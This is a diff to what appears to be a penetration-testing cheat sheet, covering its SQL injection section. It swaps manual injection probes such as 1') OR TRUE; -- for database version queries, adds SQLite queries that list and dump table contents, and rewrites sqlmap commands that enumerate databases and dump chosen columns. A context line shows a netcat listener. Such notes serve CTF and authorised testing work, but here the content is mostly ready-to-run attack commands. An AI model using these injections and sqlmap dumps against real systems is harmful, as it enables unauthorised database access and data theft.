@@ -247,16 +247,31 @@ nc -lvnp 80
 
 # SQL Injection
 
-### Analysis
+### Version
 ```
-# Manual
-'
-1'
-1' AND 1=1
-1' AND 1=1 --+
-1') OR TRUE; -- 
+# MySQL and MSSQL
+@@version
+
+# Oracle
+SELECT banner FROM v$version)
+
+# SQLite
+sqlite_version()
 ```
 
+### SQLite
+```
+# Table names
+SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
+
+# List table fields
+SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='{TABLE}'
+
+# Dump table fields
+SELECT group_concat({FIELD_1} || "," || {FIELD_2} || "," || {FIELD_3} || ":") from {TABLE}
+```
+
+### SQLMap Analysis
 ```
 # GET URL Parameter
 sqlmap -u "http://example.com/search.php?q=" -p "q" --level=3 --risk=3 --random-agent --batch
@@ -267,12 +282,12 @@ sqlmap -u "http://example.com/search.php?q=" -p "q" --level=3 --risk=3 --random-
 sqlmap -r login.req -p "{POST_PARAMETER_1},{POST_PARAMETER_2}" --level=3 --risk=3 --random-agent --batch
 ```
 
-### Navigation
 ```
-sqlmap -r login.req -p u --batch --current-db
-sqlmap -r login.req -p u --batch -D {DB} --tables
-sqlmap -r login.req -p u --batch -D {DB} -T {TABLE} --columns
-sqlmap -r login.req -p u --batch -D {DB} -T {TABLE} -C {FIELD_1},{FIELD_2},{FIELD_3} --dump
+# Navigation
+sqlmap -r login.req -p {PARAMETER} --batch --current-db
+sqlmap -r login.req -p {PARAMETER} --batch -D {DB} --tables
+sqlmap -r login.req -p {PARAMETER} --batch -D {DB} -T {TABLE} --columns
+sqlmap -r login.req -p {PARAMETER} --batch -D {DB} -T {TABLE} -C {FIELD_1},{FIELD_2},{FIELD_3} --dump
 ```
 
 # PHP Uploading Bypass
